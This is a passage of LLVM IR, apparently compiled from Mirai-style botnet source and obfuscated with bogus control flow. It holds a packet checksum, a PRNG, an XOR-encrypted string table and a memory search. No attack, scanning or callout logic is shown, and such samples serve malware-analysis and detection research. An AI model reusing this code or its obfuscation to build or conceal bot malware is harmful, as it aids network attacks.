  %50 = load i32, i32* @x.41
  %51 = load i32, i32* @y.42
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %49, label %58, label %84

; <label>:58:                                     ; preds = %originalBBpart24
  %59 = load i32, i32* @x.41
  %60 = load i32, i32* @y.42
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %58
  %67 = load i16*, i16** %17, align 8
  %68 = load i16, i16* %67, align 2
  %69 = zext i16 %68 to i32
  %70 = load i32, i32* %20, align 4
  %71 = add i32 %70, %69
  store i32 %71, i32* %20, align 4
  %72 = load i16*, i16** %17, align 8
  %73 = getelementptr inbounds i16, i16* %72, i32 1
  store i16* %73, i16** %17, align 8
  %74 = load i32, i32* %16, align 4
  %75 = sub nsw i32 %74, 2
  store i32 %75, i32* %16, align 4
  %76 = load i32, i32* @x.41
  %77 = load i32, i32* @y.42
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br label %39

; <label>:84:                                     ; preds = %originalBBpart24
  %85 = load i32, i32* %16, align 4
  %86 = icmp eq i32 %85, 1
  br i1 %86, label %87, label %110

; <label>:87:                                     ; preds = %84
  %88 = load i32, i32* @x.41
  %89 = load i32, i32* @y.42
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %87
  %96 = load i16*, i16** %17, align 8
  %97 = bitcast i16* %96 to i8*
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = load i32, i32* %20, align 4
  %101 = add i32 %100, %99
  store i32 %101, i32* %20, align 4
  %102 = load i32, i32* @x.41
  %103 = load i32, i32* @y.42
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %110

; <label>:110:                                    ; preds = %originalBBpart227, %84
  %111 = load i32, i32* %18, align 4
  %112 = lshr i32 %111, 16
  %113 = and i32 %112, 65535
  %114 = load i32, i32* %20, align 4
  %115 = add i32 %114, %113
  store i32 %115, i32* %20, align 4
  %116 = load i32, i32* %18, align 4
  %117 = and i32 %116, 65535
  %118 = load i32, i32* %20, align 4
  %119 = add i32 %118, %117
  store i32 %119, i32* %20, align 4
  %120 = load i32, i32* %19, align 4
  %121 = lshr i32 %120, 16
  %122 = and i32 %121, 65535
  %123 = load i32, i32* %20, align 4
  %124 = add i32 %123, %122
  store i32 %124, i32* %20, align 4
  %125 = load i32, i32* %19, align 4
  %126 = and i32 %125, 65535
  %127 = load i32, i32* %20, align 4
  %128 = add i32 %127, %126
  store i32 %128, i32* %20, align 4
  %129 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 6
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i16
  %133 = call zeroext i16 @htons(i16 zeroext %132) #7
  %134 = zext i16 %133 to i32
  %135 = load i32, i32* %20, align 4
  %136 = add i32 %135, %134
  store i32 %136, i32* %20, align 4
  %137 = load i16, i16* %15, align 2
  %138 = zext i16 %137 to i32
  %139 = load i32, i32* %20, align 4
  %140 = add i32 %139, %138
  store i32 %140, i32* %20, align 4
  br label %141

; <label>:141:                                    ; preds = %145, %110
  %142 = load i32, i32* %20, align 4
  %143 = lshr i32 %142, 16
  %144 = icmp ne i32 %143, 0
  br i1 %144, label %145, label %151

; <label>:145:                                    ; preds = %141
  %146 = load i32, i32* %20, align 4
  %147 = and i32 %146, 65535
  %148 = load i32, i32* %20, align 4
  %149 = lshr i32 %148, 16
  %150 = add i32 %147, %149
  store i32 %150, i32* %20, align 4
  br label %141

; <label>:151:                                    ; preds = %141
  %152 = load i32, i32* %20, align 4
  %153 = xor i32 %152, -1
  %154 = trunc i32 %153 to i16
  ret i16 %154

originalBBalteredBB:                              ; preds = %originalBB, %4
  %155 = alloca %struct.iphdr*, align 8
  %156 = alloca i8*, align 8
  %157 = alloca i16, align 2
  %158 = alloca i32, align 4
  %159 = alloca i16*, align 8
  %160 = alloca i32, align 4
  %161 = alloca i32, align 4
  %162 = alloca i32, align 4
  %163 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %155, align 8
  store i8* %1, i8** %156, align 8
  store i16 %2, i16* %157, align 2
  store i32 %3, i32* %158, align 4
  %164 = load i8*, i8** %156, align 8
  %165 = bitcast i8* %164 to i16*
  store i16* %165, i16** %159, align 8
  %166 = load %struct.iphdr*, %struct.iphdr** %155, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 8
  %168 = load i32, i32* %167, align 4
  store i32 %168, i32* %160, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %155, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 9
  %171 = load i32, i32* %170, align 4
  store i32 %171, i32* %161, align 4
  store i32 0, i32* %162, align 4
  %172 = load i32, i32* %158, align 4
  store i32 %172, i32* %163, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %173 = load i32, i32* %16, align 4
  %174 = icmp sgt i32 %173, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %58
  %175 = load i16*, i16** %17, align 8
  %176 = load i16, i16* %175, align 2
  %177 = zext i16 %176 to i32
  %178 = load i32, i32* %20, align 4
  %_ = sub i32 %178, %177
  %gen = mul i32 %_, %177
  %179 = add i32 %178, %177
  store i32 %179, i32* %20, align 4
  %180 = load i16*, i16** %17, align 8
  %181 = getelementptr inbounds i16, i16* %180, i32 1
  store i16* %181, i16** %17, align 8
  %182 = load i32, i32* %16, align 4
  %_7 = sub i32 0, %182
  %gen8 = add i32 %_7, 2
  %_9 = sub i32 %182, 2
  %gen10 = mul i32 %_9, 2
  %_11 = shl i32 %182, 2
  %_12 = sub i32 %182, 2
  %gen13 = mul i32 %_12, 2
  %_14 = shl i32 %182, 2
  %183 = sub nsw i32 %182, 2
  store i32 %183, i32* %16, align 4
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %87
  %184 = load i16*, i16** %17, align 8
  %185 = bitcast i16* %184 to i8*
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = load i32, i32* %20, align 4
  %_19 = sub i32 %188, %187
  %gen20 = mul i32 %_19, %187
  %_21 = sub i32 0, %188
  %gen22 = add i32 %_21, %187
  %_23 = sub i32 0, %188
  %gen24 = add i32 %_23, %187
  %189 = add i32 %188, %187
  store i32 %189, i32* %20, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 61, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %originalBBpart2, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %39

; <label>:13:                                     ; preds = %9
  %14 = load i32, i32* @x.45
  %15 = load i32, i32* @y.46
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = call i32 @rand_next()
  %23 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %24 = call i32 @util_strlen(i8* %23)
  %25 = urem i32 %22, %24
  %26 = zext i32 %25 to i64
  %27 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = load i8*, i8** %3, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %3, align 8
  store i8 %28, i8* %29, align 1
  %31 = load i32, i32* @x.45
  %32 = load i32, i32* @y.46
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %9

; <label>:39:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 61)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %13
  %40 = call i32 @rand_next()
  %41 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %42 = call i32 @util_strlen(i8* %41)
  %_ = sub i32 %40, %42
  %gen = mul i32 %_, %42
  %_1 = sub i32 0, %40
  %gen2 = add i32 %_1, %42
  %43 = urem i32 %40, %42
  %44 = zext i32 %43 to i64
  %45 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = load i8*, i8** %3, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %3, align 8
  store i8 %46, i8* %47, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = load i32, i32* @x.47
  %3 = load i32, i32* @y.48
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %10, align 1
  %12 = load i8, i8* %10, align 1
  %13 = zext i8 %12 to i64
  %14 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %13
  store %struct.table_value* %14, %struct.table_value** %11, align 8
  %15 = load i8, i8* %10, align 1
  call void @toggle_obf(i8 zeroext %15)
  %16 = load i32, i32* @x.47
  %17 = load i32, i32* @y.48
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %24 = alloca i8, align 1
  %25 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %24, align 1
  %26 = load i8, i8* %24, align 1
  %27 = zext i8 %26 to i64
  %28 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %27
  store %struct.table_value* %28, %struct.table_value** %25, align 8
  %29 = load i8, i8* %24, align 1
  call void @toggle_obf(i8 zeroext %29)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27

; <label>:86:                                     ; preds = %27
  %87 = load i32, i32* @x.49
  %88 = load i32, i32* @y.50
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %86
  %95 = load i32, i32* @x.49
  %96 = load i32, i32* @y.50
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %86
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %146

; <label>:16:                                     ; preds = %4
  %17 = load i32, i32* @x.55
  %18 = load i32, i32* @y.56
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  store i32 0, i32* %10, align 4
  %25 = load i32, i32* @x.55
  %26 = load i32, i32* @y.56
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart231, %originalBBpart2
  %34 = load i32, i32* @x.55
  %35 = load i32, i32* @y.56
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* %10, align 4
  %43 = load i32, i32* %7, align 4
  %44 = icmp slt i32 %42, %43
  %45 = load i32, i32* @x.55
  %46 = load i32, i32* @y.56
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %44, label %53, label %145

; <label>:53:                                     ; preds = %originalBBpart24
  %54 = load i32, i32* @x.55
  %55 = load i32, i32* @y.56
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %53
  %62 = load i8*, i8** %6, align 8
  %63 = load i32, i32* %10, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  %66 = load i8, i8* %65, align 1
  %67 = sext i8 %66 to i32
  %68 = load i8*, i8** %8, align 8
  %69 = load i32, i32* %11, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %67, %73
  %75 = load i32, i32* @x.55
  %76 = load i32, i32* @y.56
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %74, label %83, label %108

; <label>:83:                                     ; preds = %originalBBpart28
  %84 = load i32, i32* @x.55
  %85 = load i32, i32* @y.56
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %83
  %92 = load i32, i32* %11, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %11, align 4
  %94 = load i32, i32* %9, align 4
  %95 = icmp eq i32 %93, %94
  %96 = load i32, i32* @x.55
  %97 = load i32, i32* @y.56
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart219, label %originalBB10alteredBB

originalBBpart219:                                ; preds = %originalBB10
  br i1 %95, label %104, label %107

; <label>:104:                                    ; preds = %originalBBpart219
  %105 = load i32, i32* %10, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %5, align 4
  br label %146

; <label>:107:                                    ; preds = %originalBBpart219
  br label %109

; <label>:108:                                    ; preds = %originalBBpart28
  store i32 0, i32* %11, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %107
  %110 = load i32, i32* @x.55
  %111 = load i32, i32* @y.56
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %109
  %118 = load i32, i32* @x.55
  %119 = load i32, i32* @y.56
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %126

; <label>:126:                                    ; preds = %originalBBpart223
  %127 = load i32, i32* @x.55
  %128 = load i32, i32* @y.56
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %126
  %135 = load i32, i32* %10, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %10, align 4
  %137 = load i32, i32* @x.55
  %138 = load i32, i32* @y.56
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart231, label %originalBB25alteredBB

originalBBpart231:                                ; preds = %originalBB25
  br label %33

; <label>:145:                                    ; preds = %originalBBpart24
  store i32 -1, i32* %5, align 4
  br label %146

; <label>:146:                                    ; preds = %145, %104, %15
  %147 = load i32, i32* %5, align 4
  ret i32 %147

originalBBalteredBB:                              ; preds = %originalBB, %16
  store i32 0, i32* %10, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %148 = load i32, i32* %10, align 4
  %149 = load i32, i32* %7, align 4
  %150 = icmp slt i32 %148, %149
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %53
  %151 = load i8*, i8** %6, align 8
  %152 = load i32, i32* %10, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8, i8* %151, i64 %153
  %155 = load i8, i8* %154, align 1
  %156 = sext i8 %155 to i32
  %157 = load i8*, i8** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds i8, i8* %157, i64 %159
  %161 = load i8, i8* %160, align 1
  %162 = sext i8 %161 to i32
  %163 = icmp eq i32 %156, %162
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %83
  %164 = load i32, i32* %11, align 4
  %_ = sub i32 0, %164
  %gen = add i32 %_, 1
  %_11 = shl i32 %164, 1
  %_12 = sub i32 0, %164
  %gen13 = add i32 %_12, 1
  %_14 = shl i32 %164, 1
  %_15 = shl i32 %164, 1
  %_16 = sub i32 %164, 1
  %gen17 = mul i32 %_16, 1
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %11, align 4
  %166 = load i32, i32* %9, align 4
  %167 = icmp eq i32 %165, %166
  br label %originalBB10

originalBB21alteredBB:                            ; preds = %originalBB21, %109
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %126
  %168 = load i32, i32* %10, align 4
  %_26 = sub i32 %168, 1
  %gen27 = mul i32 %_26, 1
  %_28 = shl i32 %168, 1
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %10, align 4
  br label %originalBB25
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
